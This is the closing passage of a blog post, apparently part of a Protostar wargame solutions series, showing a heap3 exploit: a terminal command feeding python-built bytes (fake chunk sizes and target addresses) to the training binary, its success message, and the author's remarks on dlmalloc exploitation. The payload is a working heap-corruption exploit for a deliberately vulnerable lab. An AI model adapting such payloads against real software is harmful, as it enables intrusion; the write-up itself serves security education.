<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./heap3 AAAA$(python -c 'print "\x68\x64\x88\x04\x08\xc3" + "A"*22 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
</span><span class='line'>that wasn't too bad now, was it? @ 1411285668
</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s it!  I really wish this level had more dlmalloc exploitation, or post-2004 stuff (see <a href="http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">here</a>), but this was fun as is.  Fusion seems to be an advanced version of Protostar, so here&rsquo;s to hoping there&rsquo;s more there.</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>

      








  


<time datetime="2014-09-21T14:10:04-07:00" pubdate data-updated="true">Sep 21<span>st</span>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/protostar/'>protostar</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/" data-via="" data-counturl="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/09/16/protostar-format-strings/" title="Previous Post: Protostar solutions - Format String">&laquo; Protostar solutions - Format String</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/11/23/protostar-network/" title="Next Post: Protostar solutions - Network">Protostar solutions - Network &raquo;</a>
      
    </p>
  </footer>
</article>


</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - Bryan Alexander -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
</p>

</footer>
  










  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
